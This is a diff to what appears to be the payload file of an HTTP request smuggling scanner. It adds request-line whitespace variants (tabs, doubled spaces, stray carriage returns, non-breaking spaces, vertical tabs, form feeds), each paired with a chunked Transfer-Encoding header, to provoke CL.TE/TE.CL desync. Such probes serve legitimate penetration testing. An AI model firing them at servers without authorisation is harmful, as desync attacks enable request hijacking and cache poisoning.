@@ -39,4 +39,28 @@ for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
 	mutations["xnprespace-%02x"%i] = render_template("X: X%c\nTransfer-Encoding: chunked"%(i))
 	mutations["endspacerx-%02x"%i] = render_template("Transfer-Encoding: chunked\r%cX: X"%(i))
 	mutations["endspacexn-%02x"%i] = render_template("Transfer-Encoding: chunked%c\nX: X"%(i))
-	
+
+
+# Request-line whitespace abuse: backends and front-ends disagree on what
+# characters count as request-line separators. Pair each variant with a
+# plain Transfer-Encoding: chunked so the CL.TE/TE.CL oracle still fires
+# if the front-end normalizes but the backend doesn't (or vice-versa).
+def render_reqline(request_line_tmpl):
+	RN = "\r\n"
+	p = Payload()
+	p.header  = request_line_tmpl + RN
+	p.header += "Transfer-Encoding: chunked" + RN
+	p.header += "Host: __HOST__" + RN
+	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36" + RN
+	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
+	p.header += "Content-Length: __REPLACE_CL__" + RN
+	return p
+
+mutations["reqline-tab"]        = render_reqline("__METHOD__\t__ENDPOINT__?cb=__RANDOM__\tHTTP/1.1")
+mutations["reqline-double-sp"]  = render_reqline("__METHOD__  __ENDPOINT__?cb=__RANDOM__  HTTP/1.1")
+mutations["reqline-trail-cr"]   = render_reqline("__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\rX: X")
+mutations["reqline-nbsp"]       = render_reqline("__METHOD__ __ENDPOINT__?cb=__RANDOM__\xa0HTTP/1.1")
+mutations["reqline-vt"]         = render_reqline("__METHOD__ __ENDPOINT__?cb=__RANDOM__\x0bHTTP/1.1")
+mutations["reqline-ff"]         = render_reqline("__METHOD__ __ENDPOINT__?cb=__RANDOM__\x0cHTTP/1.1")
+mutations["reqline-mixed"]      = render_reqline("__METHOD__ \t__ENDPOINT__?cb=__RANDOM__ \tHTTP/1.1")
+
